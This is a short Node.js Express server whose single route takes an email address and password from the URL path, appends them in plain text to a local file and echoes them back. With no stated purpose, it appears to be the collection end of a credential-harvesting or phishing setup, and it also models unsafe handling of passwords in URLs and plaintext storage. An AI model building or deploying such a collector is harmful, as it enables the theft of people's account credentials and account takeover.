const express = require('express')
const fs = require('fs')

const app = express();
const port = 8080;

const doc = fs.createWriteStream('doc.txt')
doc.write('new doc created!\n')

app.get('/send/:email/:password', (req, res) => {
    doc.write(`email: ${req.params.email}\npassword: ${req.params.password}\n\n`)
    res.send('sent ' + req.params.email + 'and ' + req.params.password);

});

app.listen(port, () =>
  console.log(`Example app listening on port ${port}!`),
);